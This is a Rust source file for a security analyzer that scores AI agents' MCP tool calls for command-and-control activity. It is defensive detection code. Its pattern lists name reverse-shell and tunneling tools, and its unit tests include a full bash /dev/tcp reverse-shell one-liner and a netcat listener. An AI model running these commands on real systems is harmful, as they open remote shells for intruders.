/// Command and Control Detection - Detects C2 communication attempts
///
/// Identifies MITRE ATT&CK T1071, T1105, T1571 (Command and Control) patterns:
/// - Remote shell connections
/// - Reverse shells
/// - DNS tunneling
/// - HTTP/HTTPS C2 beaconing
/// - Non-standard ports

use crate::AnalyzerResult;
use mcp_protocol::MCPToolCall;
use regex::Regex;

pub struct CommandAndControlAnalyzer {
    reverse_shell: Vec<&'static str>,
    remote_access: Vec<&'static str>,
    tunneling: Vec<&'static str>,
    beaconing: Vec<&'static str>,
    suspicious_ports: Vec<u16>,
}

impl CommandAndControlAnalyzer {
    pub fn new() -> Self {
        Self {
            reverse_shell: vec![
                "nc -e",
                "ncat -e",
                "bash -i >& /dev/tcp/",
                "sh -i >& /dev/tcp/",
                "/dev/tcp/",
                "python -c 'import socket",
                "perl -e 'use Socket",
                "ruby -rsocket",
                "php -r '$sock",
                "mkfifo /tmp/",
            ],
            remote_access: vec![
                "ssh -R",
                "ssh -D",
                "ngrok",
                "chisel",
                "proxychains",
                "sshuttle",
                "teamviewer",
                "anydesk",
            ],
            tunneling: vec![
                "iodine",
                "dnscat",
                "dns2tcp",
                "stunnel",
                "socat",
                "gost",
                "frp",
                "nps",
            ],
            beaconing: vec![
                "while true; do curl",
                "while true; do wget",
                "watch -n",
                "cron * * * * * curl",
                "setInterval",
                "sleep",
            ],
            suspicious_ports: vec![
                4444, 4445, 5555, 6666, 7777, 8888, 9999,  // Common C2
                1337, 31337,  // Leet speak
                8080, 8443,  // Alternative HTTP/HTTPS
                4443, 5353,  // Alternative HTTPS, mDNS
            ],
        }
    }

    pub fn analyze(&self, tool_call: &MCPToolCall) -> AnalyzerResult {
        let content = self.extract_content(tool_call);
        if content.is_empty() {
            return AnalyzerResult {
                analyzer_name: "command_and_control".to_string(),
                threat_score: 0.0,
                patterns: vec![],
                metadata: serde_json::json!({}),
            };
        }

        let content_lower = content.to_lowercase();
        let mut score: f64 = 0.0;
        let mut patterns_found = Vec::new();

        // Check for reverse shells (CRITICAL)
        for &pattern in &self.reverse_shell {
            if content_lower.contains(&pattern.to_lowercase()) {
                patterns_found.push(format!("Reverse shell detected: {}", pattern));
                score = score.max(98.0);
                break;
            }
        }

        // Check for remote access tools
        for &pattern in &self.remote_access {
            if content_lower.contains(&pattern.to_lowercase()) {
                patterns_found.push(format!("Remote access tool: {}", pattern));
                score = score.max(85.0);
                break;
            }
        }

        // Check for tunneling tools
        for &pattern in &self.tunneling {
            if content_lower.contains(&pattern.to_lowercase()) {
                patterns_found.push(format!("Tunneling tool detected: {}", pattern));
                score = score.max(90.0);
                break;
            }
        }

        // Check for beaconing patterns
        for &pattern in &self.beaconing {
            if content_lower.contains(&pattern.to_lowercase()) {
                patterns_found.push(format!("C2 beaconing pattern: {}", pattern));
                score = score.max(88.0);
                break;
            }
        }

        // Check for suspicious ports
        let port_regex = Regex::new(r":(\d{1,5})").unwrap();
        for cap in port_regex.captures_iter(&content) {
            if let Ok(port) = cap[1].parse::<u16>() {
                if self.suspicious_ports.contains(&port) {
                    patterns_found.push(format!("Suspicious port detected: {}", port));
                    score = score.max(75.0);
                    break;
                }
            }
        }

        // Check for external IP connections (RFC1918 excludes)
        if self.has_external_connection(&content_lower) {
            patterns_found.push("External network connection detected".to_string());
            score = score.max(70.0);
        }

        AnalyzerResult {
            analyzer_name: "command_and_control".to_string(),
            threat_score: score.min(100.0),
            patterns: patterns_found,
            metadata: serde_json::json!({
                "mitre_attack": ["T1071", "T1105", "T1571"],
                "category": "command_and_control"
            }),
        }
    }

    fn has_external_connection(&self, content: &str) -> bool {
        // Look for patterns like curl http://, wget, nc <ip>
        let external_patterns = vec![
            "curl http://",
            "curl https://",
            "wget http://",
            "wget https://",
            "nc ",
            "ncat ",
        ];

        for pattern in external_patterns {
            if content.contains(pattern) {
                // Exclude localhost and private IPs
                if !content.contains("localhost")
                    && !content.contains("127.0.0.1")
                    && !content.contains("10.")
                    && !content.contains("192.168.") {
                    return true;
                }
            }
        }

        false
    }

    fn extract_content(&self, tool_call: &MCPToolCall) -> String {
        match tool_call {
            MCPToolCall::Bash { command, args, .. } => {
                let mut content = command.clone();
                if !args.is_empty() {
                    content.push(' ');
                    content.push_str(&args.join(" "));
                }
                content
            }
            MCPToolCall::Filesystem { path, content, .. } => {
                let mut result = path.clone();
                if let Some(bytes) = content {
                    if let Ok(text) = String::from_utf8(bytes.clone()) {
                        result.push(' ');
                        result.push_str(&text);
                    }
                }
                result
            }
            MCPToolCall::Network { url, .. } => url.clone(),
            MCPToolCall::Database { query, .. } => query.clone(),
            MCPToolCall::Unknown { params, .. } => {
                serde_json::to_string(params).unwrap_or_default()
            }
        }
    }
}

impl Default for CommandAndControlAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_reverse_shell() {
        let analyzer = CommandAndControlAnalyzer::new();
        let tool_call = MCPToolCall::Bash { args: vec![], env: std::collections::HashMap::new(),
            command: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1".to_string(),
        };

        let result = analyzer.analyze(&tool_call);
        assert!(result.threat_score > 95.0);
    }

    #[test]
    fn test_suspicious_port() {
        let analyzer = CommandAndControlAnalyzer::new();
        let tool_call = MCPToolCall::Bash { args: vec![], env: std::collections::HashMap::new(),
            command: "nc -lvnp 4444".to_string(),
        };

        let result = analyzer.analyze(&tool_call);
        assert!(result.threat_score >= 70.0);
    }

    #[test]
    fn test_safe_operations() {
        let analyzer = CommandAndControlAnalyzer::new();
        let tool_call = MCPToolCall::Bash { args: vec![], env: std::collections::HashMap::new(),
            command: "ls -la".to_string(),
        };

        let result = analyzer.analyze(&tool_call);
        assert_eq!(result.threat_score, 0.0);
    }
}
